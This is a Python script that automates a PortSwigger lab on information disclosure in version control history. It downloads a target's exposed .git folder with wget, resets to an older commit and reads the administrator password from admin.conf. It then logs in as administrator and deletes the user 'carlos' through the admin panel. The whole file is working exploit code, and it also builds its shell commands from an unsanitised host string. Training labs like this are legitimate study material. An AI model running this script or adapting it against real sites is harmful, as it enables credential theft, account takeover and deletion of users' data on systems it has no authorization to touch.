# Information disclosure in version control history

# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

import os
import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def get_git(s, url):
	print('\n[+] Downloading available .git and working on it locally...\n')
	host = url.replace('https://', '')
	git_path = url + '/.git'

	cmd = f'wget -r {git_path} -q 2>/dev/null'
	print('\n$ > ' + cmd)
	os.popen(cmd)
	time.sleep(10)
	r = os.popen(f'ls -lah ./{host}/')
	resp = r.readlines()
	for l in resp:
		print(l.encode().replace(b'\n', b'').decode())
	print()
	time.sleep(2)

	cmd = f'cd ./{host}/ && git log'
	print('\n$ > ' + cmd)
	os.popen(cmd)
	r = os.popen(cmd)
	resp = r.readlines()
	for l in resp:
		print(l.encode().replace(b'\n', b'').decode())
		if 'commit' in l:
			commit = l.split(' ')[1]
	print()
	time.sleep(2)

	cmd = f'cd ./{host}/ && git reset --hard {commit}'
	print('\n$ > ' + cmd)
	os.popen(cmd)
	r = os.popen(cmd)
	resp = r.readlines()
	for l in resp:
		print(l.encode().replace(b'\n', b'').decode())
	print()
	time.sleep(2)

	cmd = f'cat ./{host}/admin.conf'
	print('\n$ > ' + cmd)
	os.popen(cmd)
	r = os.popen(cmd)
	resp = r.readlines()
	for l in resp:
		print(l.encode().replace(b'\n', b'').decode())
		if 'ADMIN_PASSWORD' in l:
			password = l.split('=')[1].encode().replace(b'\n', b'').decode()
	print()
	time.sleep(2)

	cmd = f'rm -rf ./{host}'
	print('\n$ > ' + cmd)
	os.popen(cmd)
	r = os.popen(cmd)
	print()
	time.sleep(2)

	print('[+] Found Administrator Password:\t%s' % password)
	return password

def connect_as_admin(s, url, password):
	print('\n[+] Trying to connect as administrator with found password...')
	login_path = url + '/login'
	r = s.get(login_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {
		'csrf': csrf_token,
		'username': 'administrator',
		'password': password
	}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	if 'Your username is: administrator' in r.text:
		print('[+] Successfully logged in as Administrator !\n')
	return r

def delete_carlos(s, url):
	print('[+] Trying to access to the admin panel...')
	admin_path = url + '/admin'
	r = s.get(admin_path)
	time.sleep(1)
	delete_path = url + '/admin/delete?username=carlos'
	print('[+] Trying to delete Carlos account...')
	r = s.get(delete_path)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Information disclosure in version control history')
	parser = argparse.ArgumentParser(description="[+] Lab: Information disclosure in version control history")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to bypass authentication to delete carlos...\n')
			time.sleep(1)
			password = get_git(s, url)
			r = connect_as_admin(s, url, password)
			r = delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
